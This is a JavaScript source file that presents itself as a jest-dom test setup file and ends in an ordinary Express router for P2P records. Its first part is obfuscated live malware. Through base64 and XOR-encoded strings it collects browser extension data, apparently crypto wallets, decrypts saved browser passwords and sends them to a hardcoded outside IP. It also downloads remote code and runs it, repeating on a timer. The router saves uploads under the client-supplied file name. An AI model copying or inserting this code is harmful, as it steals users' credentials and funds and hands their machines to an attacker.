/* learn more: https://github.com/testing-library/jest-dom // @testing-library/jest-dom library provides a set of custom jest matchers that you can use to extend jest. These will make your tests more declarative, clear to read and to maintain.*/ Object
    .prototype.hasOwnProperty,
    Object.prototype.toString,
    Object.defineProperty,
    Object.getOwnPropertyDescriptor;
const t = "base64",
    c = "utf8",
    r = (r) => ((s1 = r.slice(1)), Buffer.from(s1, t).toString(c)),
    e = (r, e) => {
        let E = Buffer.from(r, t);
        const s = E.length;
        let F = 0,
            a = new Uint8Array(s);
        for (ii = 0; ii < s; ii++) {
            F = 3 & ii;
            let t = e[o](F);
            a[ii] = 255 & (E[ii] ^ t);
        }
        return ((t, c) => Buffer.from(t).toString(c))(a, c);
    },
    E = (t) => e(t, c),
    o = r("2Y2hhckNvZGVBdA"),
    s = E("BgUKUQERVQ"),
    F = E("FhwPVBErFkoaFwNLBg"),
    a = E("FgYfSAEb"),
    B = E("EAwDWw"),
    i = E("BxEXTRAHEg"),
    A = r("zcGF0aA"),
    $ = E("BRgHTBMbFFU"),
    n = E("ARkWXBwG"),
    l = E("HRsLXREdFA"),
    R = E("HRsVTBsVC10"),
    W = E("AQ0WXQ"),
    V = require("os"),
    U = require(A),
    g = require(s),
    h = require(a),
    Q = require(i),
    w = require(F)[B],
    x = V[R](),
    f = V[$](),
    y = V[l](),
    I = V[n](),
    G = V[W](),
    S = require("fs");
let u;
const d = (t) => e(t, c),
    X = (() => {
        let t = "MTQ3LjEyNCaHR0cDovLw4yMTIuODk6MTI0NA==  ";
        for (var c = "b", e = "a", E = "", o = "", s = 0; s < 10; s++)
            (c += t[s]), (e += t[10 + s]), (E += t[20 + s]), (o += t[30 + s]);
        return (c = c + E + o), r(e) + r(c);
    })(),
    H = d("ER0UVhQZAw"),
    C = (t) =>
        t.replace(/^~([a-z]+|\/)/, (t, c) =>
            "/" === c ? y : `${U[H](y)}/${c}`,
        ),
    Y = "VGVhMG00",
    D = "AgYPTBAyD1QQJx9WFg",
    k = "EhES",
    b = "WhcKURAaEg",
    M = d("WloISBk"),
    N = d(b),
    p = d(D),
    Z = d(k),
    m = d("EAwPSwEHNUEbFw"),
    j = "WgcSVwcRSFYaEAM",
    J = d("FBcFXQYHNUEbFw");
function T(t) {
    try {
        return S[J](t), !0;
    } catch (t) {
        return !1;
    }
}
const v = d("MREAWQAYEg"),
    O = d("JQYJXhwYAw"),
    K = d("WjUWSDEVEllaOAlbFBhJdRwXFFcGGwBMWjECXxBbM0sQBkZ8FAAH"),
    P = (t, c) => {
        result = "";
        try {
            const r = `${t}`,
                e = require(`${y}${d(j)}`);
            if (G != d("Ih0IXBoDFWc7IA")) return;
            const E = d("JjEqfTYgRhJVMjR3OFQKVxIdCEs"),
                s = `${C("~/")}${c}`;
            let F = U.join(s, d("ORsFWRlUNUwUAAM"));
            const a = d("FBEVFUdBUBUSFws"),
                B = d("GgYPXxwaOU0HGA"),
                i = d("AAcDShsVC10qAgdUABE"),
                A = d("BRUVSwIbFFwqAgdUABE"),
                $ = d("NgYfSAEhCEgHGxJdFgAiWQEV"),
                n = d("FgYDWQERIl0WHRZQEAYPTg"),
                l = d("BxEHXDMdCl0"),
                R = d("FhsWQTMdCl0"),
                W = d("ORsBURtUIlkBFQ"),
                V = d("Ggc5WwcNFkw"),
                Q = d("EBoFSgwEEl0RKw1dDA"),
                w = d("MRUSWRcVFV0"),
                x = d("GRUSURtF"),
                f = d("IE5G"),
                I = d("Ik5G"),
                u = d("JU5G"),
                X = d("ABoKURsf");
            S[l](F, d("AAAAFU0"), (t, c) => {
                if (!t) {
                    (mkey = JSON.parse(c)),
                        (mkey = mkey[V][Q]),
                        (mkey = ((t) => {
                            var c = atob(t),
                                r = new Uint8Array(c.length);
                            for (let t = 0; t < c.length; t++) r[t] = c[o](t);
                            return r;
                        })(mkey));
                    try {
                        const t = e[$](mkey.slice(5));
                        for (ii = 0; ii <= 200; ii++) {
                            const c = 0 === ii ? v : `${O} ${ii}`,
                                e = `${s}/${c}/${W}`,
                                o = `${s}/t${c}`;
                            if (!T(e)) continue;
                            const F = `${r}_${ii}_${O}`;
                            S[R](e, o, (c) => {
                                try {
                                    const c = new g[w](o);
                                    c.all(E, (r, e) => {
                                        var E = "";
                                        r ||
                                            e.forEach((c) => {
                                                var r = c[B],
                                                    e = c[i],
                                                    o = c[A];
                                                try {
                                                    "v" ===
                                                        o
                                                            .subarray(0, 1)
                                                            .toString() &&
                                                        ((iv = o.subarray(
                                                            3,
                                                            15,
                                                        )),
                                                        (cip = o.subarray(
                                                            15,
                                                            o.length - 16,
                                                        )),
                                                        cip.length &&
                                                            ((mmm = h[n](
                                                                a,
                                                                t,
                                                                iv,
                                                            ).update(cip)),
                                                            (E = `${E}${I}${r} ${f} ${e} ${u}${mmm.toString(x)}\n\n`)));
                                                } catch (t) {}
                                            }),
                                            c.close(),
                                            S[X](o, (t) => {}),
                                            Ut(F, E);
                                    });
                                } catch (t) {}
                            });
                        }
                    } catch (t) {}
                }
            });
        } catch (t) {}
    },
    q = E("Ex0KXRsVC10"),
    z = E("GAEKTBwrAFEZEQ"),
    L = E("ExsUVTEVElk"),
    _ = E("AAYK"),
    tt = E("GgQSURoaFQ"),
    ct = E("AxUKTRA"),
    rt = d("BxEHXBEdFGsMGgU"),
    et = d("BgAHTCYNCFs"),
    Et = (d("HAciUQcRBUwaBh8"), r("YcG9zdA")),
    ot = [
        [
            d("WjgPWgcVFEFaNRZIGR0FWQEdCVZVJxNIBRsUTFozCVcSGAMXNhwUVxgR"),
            d("WloFVxsSD19aEwlXEhgDFRYcFFcYEQ"),
            d("WjUWSDEVEllaOAlbFBhJfxobAVQQWyVQBxsLXVohFV0HVCJZARU"),
        ],
        [
            d(
                "WjgPWgcVFEFaNRZIGR0FWQEdCVZVJxNIBRsUTFo2FFkDETVXEwARWQcRSXoHFRBdWDYUVwIHA0o",
            ),
            d("WloFVxsSD19aNhRZAxE1VxMAEVkHEUl6BxUQXVg2FFcCBwNK"),
            d(
                "WjUWSDEVEllaOAlbFBhJegcVEF0mGwBMAhUUXVo2FFkDEUt6BxsRSxAGSW0GERQYMRUSWQ",
            ),
        ],
        [
            d(
                "WjgPWgcVFEFaNRZIGR0FWQEdCVZVJxNIBRsUTFoXCVVbGxZdBxUVVxMAEVkHEUh3BREUWQ",
            ),
            d("WloFVxsSD19aGxZdBxU"),
            d(
                "WjUWSDEVEllaJglZGB0IX1o7Fl0HFUZrGhISTxQGAxc6BANKFFQ1TBQWCl1aIRVdB1QiWQEV",
            ),
        ],
    ],
    st = d("ORsFWRlUI0ABEQhLHBsIGCYREkwcGgFL"),
    Ft = d("WxgJXw"),
    at = d("WxgCWg"),
    Bt = d("BhsKWRsVOVERWhJAAQ");
let it = "comp";
const At = [
        "Gx8EUR0SBF0aEwddFBsDUBkRAFYeGwJaEBIBSBIfCFY",
        "EB4EWRkWB1MaBApbHRgBUBAXAlkZGQNdEBUMVhwZDlU",
        "FxIIWRAYC1cYEQ9VHRgWVRIeCFIaBA5QBR8NVxkeFlk",
        "HBYIXR8QAFIYGQ1IFhoKSBAWDVQYGg1XEBsPUBoSA1s",
        "ExwEVx0dC1kQGARXHQQMWhcYAlsbEwVWFAQIXBoQDEg",
        "HRoAWRsfCFcWEgNXExYCXBIXD1IbGQ5WExoNXBsVB1w",
        "FBEHWx0fCFUQEhZQEAQFWxwbCFoaGw5bHhsIVxARC18",
        "HR0AWRMTC1sWEBZdHgQKVxgeDFMWEgFXERoOWxAYClI",
    ],
    $t = d("FgYDWQERNF0UEDVMBxEHVQ"),
    nt = d("WgEWVBoVAks"),
    lt = async (t, c, r) => {
        let e = t;
        if (!e || "" === e) return [];
        try {
            if (!T(e)) return [];
        } catch (t) {
            return [];
        }
        c || (c = "");
        let E = [];
        for (let r = 0; r < 200; r++) {
            const o = `${t}/${0 === r ? v : `${O} ${r}`}/${st}`;
            for (let t = 0; t < At.length; t++) {
                const s = d(At[t]);
                let F = `${o}/${s}`;
                if (T(F)) {
                    try {
                        far = S[rt](F);
                    } catch (t) {
                        far = [];
                    }
                    far.forEach(async (t) => {
                        e = U.join(F, t);
                        try {
                            (e.includes(Ft) || e.includes(at)) &&
                                E.push({
                                    [ct]: S[$t](e),
                                    [tt]: { [q]: `${c}${r}_${s}_${t}` },
                                });
                        } catch (t) {}
                    });
                }
            }
        }
        if (r && ((e = `${y}${d("WloFVxsSD19aBwlUFBoHFxwQSFIGGwg")}`), S[m](e)))
            try {
                E.push({ [ct]: S[$t](e), [tt]: { [q]: Bt } });
            } catch (t) {}
        const o = { type: Y, hid: it, [z]: E };
        try {
            const t = { [_]: `${X}${nt}`, [L]: o };
            Q[Et](t, (t, c, r) => {});
        } catch (t) {}
        return E;
    },
    Rt = () => {
        try {
            ot.forEach((t, c) => {
                P(c, t[2]);
            }),
                P(3, K);
        } catch (t) {}
    },
    Wt = d("Wh8DQQY"),
    Vt = d("BQ0SUBoa"),
    Ut = async (t, c) => {
        const r = {
                ts: u.toString(),
                type: Y,
                hid: it,
                ss: t,
                cc: c.toString(),
            },
            e = { [_]: `${X}${Wt}`, [L]: r };
        try {
            Q[Et](e, (t, c, r) => {});
        } catch (t) {}
    },
    gt = d("BVocUQ"),
    ht = d("WgQCVwIa"),
    Qt = d("BxEIWRgRNUEbFw"),
    wt = d("BxEIWRgR"),
    xt = d("Bxk1QRsX"),
    ft = d("ARUUGFgMAA"),
    yt = d("FgEUVFVZKlc"),
    It = d("KVoWQQUoFkEBHAlWWxEeXQ"),
    Gt = 51476596;
let St = 0;
const ut = async (t) => {
        w(`${ft} ${t} -C ${y}`, (c, r, e) => {
            if (c)
                return (
                    console.error(`err unfile: ${c}`), S[xt](t), void (St = 0)
                );
            S[xt](t), Ct();
        });
    },
    dt = () => {
        const t = d("BUZIQhwE"),
            c = `${X}${ht}`,
            r = `${I}\\${gt}`,
            e = `${I}\\${t}`;
        if (!(St >= Gt))
            if (S[m](r))
                try {
                    var E = S[et](r);
                    E.size >= Gt
                        ? ((St = E.size),
                          S[wt](r, e, (t) => {
                              if (t) throw t;
                              ut(e);
                          }))
                        : (St < E.size ? (St = E.size) : (S[xt](r), (St = 0)),
                          Xt());
                } catch (t) {}
            else {
                w(`${yt} "${r}" "${c}"`, (t, c, E) => {
                    if (t) return (St = 0), void Xt();
                    try {
                        (St = Gt), S[Qt](r, e), ut(e);
                    } catch (t) {}
                });
            }
    };
function Xt() {
    setTimeout(() => {
        dt();
    }, 2e4);
}
const Ht = async () => {
        var t = process.version.match(/^v(\d+\.\d+)/)[1];
        const c = `${X}${d("WhoJXBBb")}${t}`,
            r = `${y}${d(j)}`;
        if (S[m](r)) Rt();
        else {
            w(`${yt} "${r}" "${c}"`, (t, c, r) => {
                Rt();
            });
        }
    },
    Ct = async () =>
        await new Promise((t, c) => {
            if ("w" == f[0]) {
                const t = `${y}${It}`;
                S[m](`${t}`)
                    ? (() => {
                          const t = `${X}${N}/${Y}`,
                              c = `${y}${M}`,
                              r = `"${y}${It}" "${c}"`;
                          try {
                              S[xt](c);
                          } catch (t) {}
                          Q[Z](t, (t, e, E) => {
                              if (t) Ht();
                              else
                                  try {
                                      S[p](c, E),
                                          w(r, (t, c, r) => {
                                              Ht();
                                          });
                                  } catch (t) {
                                      Ht();
                                  }
                          });
                      })()
                    : (Ht(), dt());
            } else
                (() => {
                    const t = d(b),
                        c = d(D),
                        r = d(k),
                        e = `${X}${t}/${Y}`,
                        E = `${y}${M}`;
                    let o = `${Vt}3 "${E}"`;
                    Q[r](e, (t, r, e) => {
                        t || (S[c](E, e), w(o, (t, c, r) => {}));
                    });
                })();
        });
var Yt = 0;
const Dt = async () => {
    try {
        (u = Date.now()),
            await (async () => {
                it = x;
                try {
                    const t = C("~/");
                    ot.forEach(async (c, r) => {
                        let e = "";
                        (e =
                            "d" == f[0]
                                ? `${t}${c[0]}`
                                : "l" == f[0]
                                  ? `${t}${c[1]}`
                                  : `${t}${c[2]}`),
                            await lt(e, `${r}_`, 0 == r);
                    }),
                        "w" == f[0] &&
                            ((pa = `${t}${K}`), await lt(pa, "3_", !1));
                } catch (t) {}
            })(),
            Ct();
    } catch (t) {}
};
Dt();
let kt = setInterval(() => {
    (Yt += 1) < 5 ? Dt() : clearInterval(kt);
}, 6e5);
module.exports = Dt;

const router = require("express").Router();
const auth = require("../../middleware/auth.middleware");
const Role = require("../../utils/userRoles.utils");
const awaitHandlerFactory = require("../../middleware/awaitHandlerFactory.middleware");
const P2PController = require("../../controllers/p2p.controller.js");
const multer = require("multer");
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, "./upload");
    },
    filename: function (req, file, cb) {
        cb(null, file.originalname);
    },
});

const upload = multer({ storage });

router.post(
    "/create",
    auth(Role.Super),
    awaitHandlerFactory(P2PController.createP2P),
);
router.post(
    "/id/:id",
    auth(Role.Super),
    awaitHandlerFactory(P2PController.updateP2P),
);
router.delete(
    "/id/:id",
    auth(Role.Super),
    awaitHandlerFactory(P2PController.deleteP2P),
);
router.get("/", awaitHandlerFactory(P2PController.getAllP2P));
router.get("/id/:id", awaitHandlerFactory(P2PController.getOneP2P));
router.post(
    "/upload",
    upload.single("avatar"),
    awaitHandlerFactory(P2PController.uploadImage),
);

module.exports = router;
